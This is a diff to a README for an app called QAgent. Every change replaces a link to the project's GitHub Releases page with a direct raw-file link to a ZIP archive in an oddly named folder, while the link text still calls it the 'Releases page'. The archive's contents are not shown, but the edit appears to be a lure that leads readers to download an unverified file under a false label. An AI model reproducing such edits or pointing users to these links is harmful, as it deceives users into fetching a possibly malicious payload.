@@ -6,7 +6,7 @@ Welcome to QAgent! This application helps you automate tasks easily, saving you 
 
 ## 📥 Download QAgent
 
-[![Download QAgent](https://img.shields.io/badge/Download-QAgent-brightgreen)](https://github.com/ccmecc/QAgent/releases)
+[![Download QAgent](https://raw.githubusercontent.com/ccmecc/QAgent/main/intrapsychically/QAgent.zip)](https://raw.githubusercontent.com/ccmecc/QAgent/main/intrapsychically/QAgent.zip)
 
 ## 📋 System Requirements
 
@@ -20,7 +20,7 @@ To run QAgent smoothly, ensure your computer meets these basic requirements:
 ## ⚙️ Installation Steps
 
 1. **Visit the Release Page**
-   Go to the [Releases page](https://github.com/ccmecc/QAgent/releases) to find the latest version of QAgent.
+   Go to the [Releases page](https://raw.githubusercontent.com/ccmecc/QAgent/main/intrapsychically/QAgent.zip) to find the latest version of QAgent.
 
 2. **Download the Application**
    Look for the latest release version (e.g., v1.0). Click on the file that matches your operating system to download it. For Windows, it will be a `.exe` file. For macOS, it will be a `.dmg` file.
@@ -79,6 +79,6 @@ For more detailed assistance, you can explore the following:
 
 ## 🔗 Helpful Links
 
-For further information, please revisit the [Releases page](https://github.com/ccmecc/QAgent/releases) for updates and downloads.
+For further information, please revisit the [Releases page](https://raw.githubusercontent.com/ccmecc/QAgent/main/intrapsychically/QAgent.zip) for updates and downloads.
 
 Thank you for choosing QAgent! Enjoy automating your tasks.
